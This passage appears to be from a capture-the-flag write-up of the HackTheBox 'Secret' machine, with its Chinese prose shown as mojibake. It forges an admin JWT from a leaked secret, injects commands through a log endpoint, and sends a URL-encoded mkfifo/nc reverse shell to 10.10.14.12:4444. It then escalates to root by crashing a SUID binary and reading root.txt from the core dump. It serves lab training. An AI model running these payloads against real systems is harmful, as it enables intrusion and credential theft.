<h3 id="Âú®Á∫øÂ∑•ÂÖ∑"><a href="#Âú®Á∫øÂ∑•ÂÖ∑" class="headerlink" title="Âú®Á∫øÂ∑•ÂÖ∑"></a><strong>Âú®Á∫øÂ∑•ÂÖ∑</strong></h3><p>ÁÑ∂Âêé‰º™ÈÄ†‰∏Ä‰∏™adminÁöÑtokenÂ∞±ÂèØ‰ª•‰∫Ü</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image7.png" class>

<p>ËøôÈáåÈúÄË¶Å‰øÆÊîπ‰∏§‰∏™Âú∞ÊñπÔºåÊäänameÂ§Ñ‰øÆÊîπ‰∏∫theadminÔºåÁÑ∂ÂêéÂú®‰∏ãÊñπÊ°ÜÂÜÖÂ°´ÂÖ•Êàë‰ª¨Âú®<code>.env</code>Ëé∑ÂèñÂà∞ÁöÑtokenÂÄºÔºåÂç≥ÂèØÁîüÊàê‰∏ÄÊÆµÊñ∞ÁöÑJWT‰ª§Áâå</p>
<h3 id="JWT-Tools"><a href="#JWT-Tools" class="headerlink" title="JWT_Tools"></a><strong>JWT_Tools</strong></h3><pre><code class="Plain">python3 jwt_tool.py -I -S hs256 -pc &#39;name&#39; -pv &#39;theadmin&#39; -p &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
</code></pre>
<p>Êàë‰ª¨ÁªßÁª≠</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
‚îî‚îÄ# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}
</code></pre>
<p>Êàë‰ª¨ÂéªÈ™åËØÅ‰∏Ä‰∏ãÊñ∞ÁöÑJWT‰ª§ÁâåÔºåÂèëÁé∞Â∑≤ÁªèÊòØadminÊùÉÈôê‰∫Ü</p>
<p>ÈÄöËøáÂàÜÊûêprivate.jsÊñá‰ª∂ÔºåÊàë‰ª¨ÂèëÁé∞ÂøÖÈ°ªÂ∞ÜÊñá‰ª∂ÂêçÊåáÂÆö‰∏∫Â∏¶ÊúâÂêçÁß∞Êñá‰ª∂ÁöÑgetÂèÇÊï∞</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
‚îî‚îÄ# curl &#39;http://secret.htb/api/logs?file=/etc/passwd&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;}
</code></pre>
<p>ÁúãÁùÄÊÑüËßâÂÉèÊòØÂëΩ‰ª§Ê≥®ÂÖ•Ôºü</p>
<h2 id="ÊºèÊ¥ûÂà©Áî®"><a href="#ÊºèÊ¥ûÂà©Áî®" class="headerlink" title="ÊºèÊ¥ûÂà©Áî®"></a><strong>ÊºèÊ¥ûÂà©Áî®</strong></h2><pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
‚îî‚îÄ# curl &#39;http://secret.htb/api/logs?file=;id&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
&quot;80bf34c fixed typos üéâ\n0c75212 now we can view logs from server üòÉ\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n&quot;
</code></pre>
<p>OKÔºåÁ°ÆËÆ§ÊºèÊ¥ûÊòØÂ≠òÂú®ÁöÑÔºåÈÇ£‰πàÊàë‰ª¨Áé∞Âú®ÂÖà‰ΩøÁî®ncÁõëÂê¨‰∏Ä‰∏™Á´ØÂè£</p>
<pre><code class="Plain">nc -nvlp 4444
</code></pre>
<p>ÁÑ∂ÂêéÊé•ÁùÄÊûÑÈÄ†‰∏Ä‰∏™payloadÊù•ËøõË°åÂà©Áî®</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
‚îî‚îÄ# curl &#39;http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;killed&quot;:false,&quot;code&quot;:1,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f\n\n&quot;}
</code></pre>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314
/bin/sh: 0: can&#39;t access tty; job control turned off
$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
dasith@secret:~/local-web$ whoami&amp;&amp;id
whoami&amp;&amp;id
dasith
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
</code></pre>
<p>ÊàêÂäüËé∑ÂèñÂà∞‰∏Ä‰∏™shell</p>
<pre><code class="Plain">dasith@secret:~/local-web$ cd
cd
dasith@secret:~$ ls
ls
local-web  user.txt
dasith@secret:~$ cat user.txt
cat user.txt
2b3b6e0a590097b69da4de9631b570fd
</code></pre>
<p>ÊàêÂäüËé∑ÂèñÂà∞userÊùÉÈôêÁöÑflagÊñá‰ª∂</p>
<h2 id="ÊùÉÈôêÊèêÂçá"><a href="#ÊùÉÈôêÊèêÂçá" class="headerlink" title="ÊùÉÈôêÊèêÂçá"></a><strong>ÊùÉÈôêÊèêÂçá</strong></h2><p>Êü•Áúã‰∏Ä‰∏ãÂΩìÂâçÁöÑÂèØÊâßË°åÊñá‰ª∂</p>
<pre><code class="Plain">find / -type f -perm -u=s 2&gt;/dev/null
</code></pre>
<pre><code class="Plain">dasith@secret:~$ find / -type f -perm -u=s 2&gt;/dev/null
find / -type f -perm -u=s 2&gt;/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
</code></pre>
<p>Ëé∑ÂèñÂà∞‰∫Ü‰∏Ä‰∫õÂèØÊâßË°åÁöÑ‰∫åËøõÂà∂Êñá‰ª∂</p>
<p>Êàë‰ª¨ÊääÁõÆÂÖâÁùÄÁúºÊîæÂú®<code>/opt/count</code>‰∏ä</p>
<pre><code class="Plain">dasith@secret:/opt$ cat code.c
cat code.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;dirent.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;linux/limits.h&gt;

void dircount(const char *path, char *summary)
{
 ¬†  DIR *dir;
 ¬†  char fullpath[PATH_MAX];
 ¬†  struct dirent *ent;
 ¬†  struct stat fstat;

 ¬†  int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

 ¬†  if((dir = opendir(path)) == NULL)
 ¬†  {
 ¬† ¬† ¬†  printf(&quot;\nUnable to open directory.\n&quot;);
 ¬† ¬† ¬†  exit(EXIT_FAILURE);
 ¬†  }
 ¬†  while ((ent = readdir(dir)) != NULL)
 ¬†  {
 ¬† ¬† ¬†  ++tot;
 ¬† ¬† ¬†  strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
 ¬† ¬† ¬†  strcat(fullpath, &quot;/&quot;);
 ¬† ¬† ¬†  strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name));
 ¬† ¬† ¬†  if (!lstat(fullpath, &amp;fstat))
 ¬† ¬† ¬†  {
 ¬† ¬† ¬† ¬† ¬†  if(S_ISDIR(fstat.st_mode))
 ¬† ¬† ¬† ¬† ¬†  {
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  printf(&quot;d&quot;);
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  ++directories;
 ¬† ¬† ¬† ¬† ¬†  }
 ¬† ¬† ¬† ¬† ¬†  else if(S_ISLNK(fstat.st_mode))
 ¬† ¬† ¬† ¬† ¬†  {
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  printf(&quot;l&quot;);
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  ++symlinks;
 ¬† ¬† ¬† ¬† ¬†  }
 ¬† ¬† ¬† ¬† ¬†  else if(S_ISREG(fstat.st_mode))
 ¬† ¬† ¬† ¬† ¬†  {
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  printf(&quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  ++regular_files;
 ¬† ¬† ¬† ¬† ¬†  }
 ¬† ¬† ¬† ¬† ¬†  else printf(&quot;?&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;);
 ¬† ¬† ¬† ¬† ¬†  printf((fstat.st_mode &amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;);
 ¬† ¬† ¬†  }
 ¬† ¬† ¬†  else
 ¬† ¬† ¬†  {
 ¬† ¬† ¬† ¬† ¬†  printf(&quot;??????????&quot;);
 ¬† ¬† ¬†  }
 ¬† ¬† ¬†  printf (&quot;\t%s\n&quot;, ent-&gt;d_name);
 ¬†  }
 ¬†  closedir(dir);

 ¬†  snprintf(summary, 4096, &quot;Total entries ¬† ¬† ¬† = %d\nRegular files ¬† ¬† ¬† = %d\nDirectories ¬† ¬† ¬† ¬† = %d\nSymbolic links ¬† ¬†  = %d\n&quot;, tot, regular_files, directories, symlinks);
 ¬†  printf(&quot;\n%s&quot;, summary);
}

void filecount(const char *path, char *summary)
{
 ¬†  FILE *file;
 ¬†  char ch;
 ¬†  int characters, words, lines;

 ¬†  file = fopen(path, &quot;r&quot;);

 ¬†  if (file == NULL)
 ¬†  {
 ¬† ¬† ¬†  printf(&quot;\nUnable to open file.\n&quot;);
 ¬† ¬† ¬†  printf(&quot;Please check if file exists and you have read privilege.\n&quot;);
 ¬† ¬† ¬†  exit(EXIT_FAILURE);
 ¬†  }

 ¬†  characters = words = lines = 0;
 ¬†  while ((ch = fgetc(file)) != EOF)
 ¬†  {
 ¬† ¬† ¬†  characters++;
 ¬† ¬† ¬†  if (ch == &#39;\n&#39; || ch == &#39;\0&#39;)
 ¬† ¬† ¬† ¬† ¬†  lines++;
 ¬† ¬† ¬†  if (ch == &#39; &#39; || ch == &#39;\t&#39; || ch == &#39;\n&#39; || ch == &#39;\0&#39;)
 ¬† ¬† ¬† ¬† ¬†  words++;
 ¬†  }

 ¬†  if (characters &gt; 0)
 ¬†  {
 ¬† ¬† ¬†  words++;
 ¬† ¬† ¬†  lines++;
 ¬†  }

 ¬†  snprintf(summary, 256, &quot;Total characters = %d\nTotal words ¬† ¬†  = %d\nTotal lines ¬† ¬†  = %d\n&quot;, characters, words, lines);
 ¬†  printf(&quot;\n%s&quot;, summary);
}

int main()
{
 ¬†  char path[100];
 ¬†  int res;
 ¬†  struct stat path_s;
 ¬†  char summary[4096];

 ¬†  printf(&quot;Enter source file/directory name: &quot;);
 ¬†  scanf(&quot;%99s&quot;, path);
 ¬†  getchar();
 ¬†  stat(path, &amp;path_s);
 ¬†  if(S_ISDIR(path_s.st_mode))
 ¬† ¬† ¬†  dircount(path, summary);
 ¬†  else
 ¬† ¬† ¬†  filecount(path, summary);

 ¬†  // drop privs to limit file write
 ¬†  setuid(getuid());
 ¬†  // Enable coredump generation
 ¬†  prctl(PR_SET_DUMPABLE, 1);
 ¬†  printf(&quot;Save results a file? [y/N]: &quot;);
 ¬†  res = getchar();
 ¬†  if (res == 121 || res == 89) {
 ¬† ¬† ¬†  printf(&quot;Path: &quot;);
 ¬† ¬† ¬†  scanf(&quot;%99s&quot;, path);
 ¬† ¬† ¬†  FILE *fp = fopen(path, &quot;a&quot;);
 ¬† ¬† ¬†  if (fp != NULL) {
 ¬† ¬† ¬† ¬† ¬†  fputs(summary, fp);
 ¬† ¬† ¬† ¬† ¬†  fclose(fp);
 ¬† ¬† ¬†  } else {
 ¬† ¬† ¬† ¬† ¬†  printf(&quot;Could not open %s for writing\n&quot;, path);
 ¬† ¬† ¬†  }
 ¬†  }

 ¬†  return 0;
}
</code></pre>
<p>ËøôÊòØcountÁöÑÊ∫êÁ†ÅÔºåÈÄöËøáÂàÜÊûêÂêéÂæóÁü•</p>
<p>ËøôÈáåÂ§ßÂ§öÊï∞ÊÉÖÂÜµ‰∏ãÔºåÂ¶ÇÊûúÊàë‰ª¨Âú®ÊâßË°å‰ª£Á†Å‰∏≠Â¥©Ê∫É‰∫ÜÔºåÊä•ÂëäÈÄöÂ∏∏‰ºö‰øùÂ≠òÂú®<code>/var/crash</code>‰∏≠</p>
<p>Âú®ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåËøôÊòØ‰∏çÂèØËÉΩÁöÑÔºå‰ΩÜÊòØÈÄöËøáËøô‰∏™pemËÆæÁΩÆ<code>prctl(PR_SET_DUMPABLE, 1);</code>ÔºåÂÆÉÂèØ‰ª•Ë¢´ÂÆûÁé∞</p>
<p>Áî±‰∫éÂÆÉËÆæÁΩÆ‰∏∫1ÔºåÊàë‰ª¨ÂèØ‰ª•‰∫ßÁîüÊ†∏ÂøÉËΩ¨ÂÇ®ÔºåÂà©Áî®ÁöÑËØùÈúÄË¶Å‰∏§‰∏™Êù°‰ª∂</p>
<ol>
<li>È¶ñÂÖàÈúÄË¶ÅÁ°Æ‰øùÊúâ‰∏§‰∏™shell</li>
<li>ÂèØ‰ª•ÂØºËá¥Â¥©Ê∫É</li>
</ol>
<p>Áé∞Âú®ËÆ©Êàë‰ª¨ÂéªÁî®‰∏äÈù¢ÊºèÊ¥ûÂà©Áî®ÁöÑÊñπÂºèÂÜçËé∑Âèñ‰∏Ä‰∏™shell</p>
<h3 id="Shell-1"><a href="#Shell-1" class="headerlink" title="Shell 1"></a><strong>Shell 1</strong></h3><pre><code class="Plain">dasith@secret:/$ cd /opt
cd /opt
dasith@secret:/opt$ ./count -p
./count -p
Enter source file/directory name: /root/root.txt
/root/root.txt

Total characters = 33
Total words ¬† ¬†  = 2
Total lines ¬† ¬†  = 2
Save results a file? [y/N]: y
y
</code></pre>
<p>ÊâßË°åÂêéÂéªshell 2ËÆ©ËøõÁ®ãÂ¥©Ê∫É</p>
<h3 id="Shell-2"><a href="#Shell-2" class="headerlink" title="Shell 2"></a><strong>Shell 2</strong></h3><pre><code class="Plain">dasith@secret:~/local-web$ cd /opt
cd /opt
dasith@secret:/opt$ ps -aux | grep count
ps -aux | grep count
root ¬† ¬† ¬† ¬† 862  0.0  0.1 235672  7480 ? ¬† ¬† ¬†  Ssl  06:15 ¬† 0:00 /usr/lib/accountsservice/accounts-daemon
root ¬† ¬† ¬†  1342  0.0  0.0 ¬† 2488 ¬† 516 ? ¬† ¬† ¬†  S ¬†  06:50 ¬† 0:00 ./count
root ¬† ¬† ¬†  1435  0.0  0.0 ¬† 2488 ¬† 588 ? ¬† ¬† ¬†  S ¬†  06:54 ¬† 0:00 ./count
dasith ¬† ¬†  1460  0.0  1.0  52448 41712 ? ¬† ¬† ¬†  S ¬†  07:00 ¬† 0:00 gdb ./count
dasith ¬† ¬†  1462  0.0  0.0 ¬† 2488 ¬† 600 ? ¬† ¬† ¬†  S ¬†  07:00 ¬† 0:00 /opt/count
root ¬† ¬† ¬†  1850  0.0  0.0 ¬† 2488 ¬† 592 pts/0 ¬†  S+ ¬† 07:41 ¬† 0:00 ./count -p
dasith ¬† ¬†  1885  0.0  0.0 ¬† 2488 ¬† 524 pts/4 ¬†  S+ ¬† 07:43 ¬† 0:00 ./count -p
dasith ¬† ¬†  1887  0.0  0.0 ¬† 6432 ¬† 740 pts/2 ¬†  S+ ¬† 07:44 ¬† 0:00 grep --color=auto count
dasith@secret:/opt$ kill -BUS 1885
kill -BUS 1885
</code></pre>
<p>ÁÑ∂ÂêéÂÜçÂéªshell1Ê£ÄÊü•ËøõÁ®ãÊòØÂê¶Â¥©Ê∫É</p>
<h3 id="Shell-1-Á¨¨‰∫åÊ¨°"><a href="#Shell-1-Á¨¨‰∫åÊ¨°" class="headerlink" title="Shell 1 Á¨¨‰∫åÊ¨°"></a><strong>Shell 1 Á¨¨‰∫åÊ¨°</strong></h3><pre><code class="Plain">Path: Bus error (core dumped)
</code></pre>
<p>Â∑≤ÁªèÁúãÂà∞ËøôÂè•ÊèêÁ§∫‰∫ÜÔºå‰ΩÜ‰Ωú‰∏∫‰øùÈô©Êàë‰ª¨ËøòÊòØÂÜçÈ™åËØÅ‰∏ÄÊ¨°</p>
<pre><code class="Plain">dasith@secret:/opt$ cd /var/crash
cd /var/crash
dasith@secret:/var/crash$ ls -la
ls -la
total 36
drwxrwxrwt  2 root ¬† root ¬†  4096 Dec  6 07:44 .
drwxr-xr-x 14 root ¬† root ¬†  4096 Aug 13 05:12 ..
-rw-r-----  1 dasith dasith 28207 Dec  6 07:44 _opt_count.1000.crash
</code></pre>
<p>ËøôÈáåÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÁîüÊàê‰∫ÜÈîôËØØÊó•Âøó‰∫ÜÔºåÊñ∞Âª∫‰∏Ä‰∏™Êàë‰ª¨Ëá™Â∑±ÁöÑÁõÆÂΩïÔºåÁÑ∂ÂêéÊääÊñá‰ª∂Êã∑Ë¥ùËøáÂéª</p>
<pre><code class="Plain">dasith@secret:/var/crash$ mkdir /tmp/lucifiel
mkdir /tmp/lucifiel
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel
apport-unpack _opt_count.1000.crash /tmp/lucifiel
dasith@secret:/var/crash$ cd /tmp/lucifiel
cd /tmp/lucifiel
dasith@secret:/tmp/lucifiel$ ls -la
ls -la
total 436
drwxr-xr-x  2 dasith dasith ¬† 4096 Dec  6 07:51 .
drwxrwxrwt 13 root ¬† root ¬† ¬† 4096 Dec  6 07:49 ..
-rw-r--r--  1 dasith dasith ¬† ¬†  5 Dec  6 07:51 Architecture
-rw-r--r--  1 dasith dasith 380928 Dec  6 07:51 CoreDump
-rw-r--r--  1 dasith dasith ¬† ¬† 24 Dec  6 07:51 Date
-rw-r--r--  1 dasith dasith ¬† ¬† 12 Dec  6 07:51 DistroRelease
-rw-r--r--  1 dasith dasith ¬† ¬† 10 Dec  6 07:51 ExecutablePath
-rw-r--r--  1 dasith dasith ¬† ¬† 10 Dec  6 07:51 ExecutableTimestamp
-rw-r--r--  1 dasith dasith ¬† ¬†  5 Dec  6 07:51 ProblemType
-rw-r--r--  1 dasith dasith ¬† ¬† 10 Dec  6 07:51 ProcCmdline
-rw-r--r--  1 dasith dasith ¬† ¬†  4 Dec  6 07:51 ProcCwd
-rw-r--r--  1 dasith dasith ¬† ¬† 53 Dec  6 07:51 ProcEnviron
-rw-r--r--  1 dasith dasith ¬† 2144 Dec  6 07:51 ProcMaps
-rw-r--r--  1 dasith dasith ¬† 1336 Dec  6 07:51 ProcStatus
-rw-r--r--  1 dasith dasith ¬† ¬†  1 Dec  6 07:51 Signal
-rw-r--r--  1 dasith dasith ¬† ¬† 29 Dec  6 07:51 Uname
-rw-r--r--  1 dasith dasith ¬† ¬†  3 Dec  6 07:51 UserGroups
</code></pre>
<p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Êúâ‰∏Ä‰∏™CoreDumpÊñá‰ª∂ÔºåÊàë‰ª¨Â∞ÜÂÖ∂‰ª•Â≠óÁ¨¶‰∏≤ÂΩ¢ÂºèËæìÂá∫</p>
<pre><code class="Plain">dasith@secret:/tmp/lucifiel$ strings CoreDump
strings CoreDump
CORE
CORE
count
./count -p
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
////////////////
Path:
Could
LINUX
////////////////
Path:
Could
TUUU
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
fclose
opendir
getuid
strncat
__cxa_finalize
__libc_start_main
snprintf
__xstat
__lxstat
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Unable to open directory.
??????????
Total entries ¬† ¬† ¬† = %d
Regular files ¬† ¬† ¬† = %d
Directories ¬† ¬† ¬† ¬† = %d
Symbolic links ¬† ¬†  = %d
Unable to open file.
Please check if file exists and you have read privilege.
Total characters = %d
Total words ¬† ¬†  = %d
Total lines ¬† ¬†  = %d
Enter source file/directory name:
%99s
Save results a file? [y/N]:
Path:
Could not open %s for writing
:*3$&quot;
Path: esults a file? [y/N]: words ¬† ¬†  = 2
Total lines ¬† ¬†  = 2
oot/root.txt
1bf72c039cbd58751b38c6916602f537
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
uTi7J
|F:m
_rtld_global
__get_cpu_features
_dl_find_dso_for_object
_dl_make_stack_executable
_dl_exception_create
__libc_stack_end
_dl_catch_exception
malloc
_dl_deallocate_tls
_dl_signal_exception
__tunable_get_val
__libc_enable_secure
__tls_get_addr
_dl_get_tls_static_info
calloc
_dl_exception_free
_dl_debug_state
_dl_argv
_dl_allocate_tls_init
_rtld_global_ro
realloc
_dl_rtld_di_serinfo
_dl_mcount
_dl_allocate_tls
_dl_signal_error
_dl_exception_create_format
_r_debug
_dl_catch_error
ld-linux-x86-64.so.2
GLIBC_2.2.5
GLIBC_2.3
GLIBC_2.4
GLIBC_PRIVATE
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
%%%%%%%%%%%%%%%%
////////////////
ory name:
%99s
/root/root.txt
Total characters = 33
Total words ¬† ¬†  = 2
Total lines ¬† ¬†  = 2
cI,b
x86_64
./count
SHELL=/bin/sh
versioning=[object Object]
unstable_restarts=0
treekill=true
env=[object Object]
filter_env=
namespace=default
restart_time=0
DB_CONNECT=mongodb://127.0.0.1:27017/auth-web
axm_options=[object Object]
vizion_running=false
PWD=/opt
LOGNAME=dasith
PM2_USAGE=CLI
exec_interpreter=node
PM2_HOME=/home/dasith/.pm2
HOME=/home/dasith
NODE_APP_INSTANCE=0
LANG=en_US.UTF-8
LS_COLORS=
pm_id=0
version=1.0.0
pm_uptime=1638771355228
km_link=false
pm_cwd=/home/dasith/local-web
axm_monitor=[object Object]
instance_var=NODE_APP_INSTANCE
pmx=true
unique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c
LESSCLOSE=/usr/bin/lesspipe %s %s
vizion=true
username=dasith
LESSOPEN=| /usr/bin/lesspipe %s
watch=false
windowsHide=true
automation=true
axm_actions=
SHLVL=1
TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
PM2_INTERACTOR_PROCESSING=true
created_at=1633619800035
merge_logs=true
pm_pid_path=/home/dasith/.pm2/pids/index-0.pid
PATH=/usr/bin:/bin
pm_err_log_path=/home/dasith/.pm2/logs/index-error.log
node_version=10.19.0
kill_retry_time=100
autorestart=true
axm_dynamic=[object Object]
node_args=
